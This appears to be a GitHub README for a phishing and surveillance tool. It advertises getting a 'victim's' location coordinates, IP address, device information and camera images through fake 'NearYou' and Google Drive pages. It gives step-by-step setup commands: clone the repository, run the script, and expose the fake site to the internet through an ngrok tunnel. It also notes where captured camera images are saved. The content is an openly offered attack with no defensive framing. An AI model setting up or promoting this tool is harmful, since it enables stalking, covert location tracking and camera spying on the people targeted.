<p align="center"><img src="https://image.flaticon.com/icons/png/512/48/48704.png"></p>
<h4 align="center">
Get Your Victim's Latitude Full Coordinate İnformation And Access Your Camera By Creating a Fake Website
</h4>

<p align="center">
<img src="https://img.shields.io/badge/Python-3-brightgreen.svg?style=plastic">
<img src="https://img.shields.io/badge/Python-2-brightgreen.svg?style=plastic">
<img src="https://img.shields.io/badge/Docker-✔-blue.svg?style=plastic">
<img src="https://img.shields.io/badge/Termux-✔-red.svg?style=plastic">
<img src="https://img.shields.io/badge/NetHunter-✔-red.svg?style=plastic">
</p>

                                                           [SETUP]

### Ubuntu/Kali Linux/Termux
               
```bash
git clone https://github.com/Klavyeli/Local.git
cd Local/
chmod 777 install.sh
./install.sh

run
python3 local.py -t manual
(1) NearYou Coordinate, IP, Mobile İnformation
(2) GDrive  Coordinate, IP, Mobile İnformation, Camera Access

Open a second terminal and start ngrok server


Enter https://ngrok.com/ and register, select your distribution from the download section 2. open a terminal and enter commands in order
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.tgz
unzip ngrok-stable-linux-arm64.tgz
copy the token defined by your account to you and continue to execute commands
./ngrok authtoken <copy the token here>
./ngrok http 8080

```
NOT: Camera data from GDrive will be saved to the template/gdrive/php folder in png format
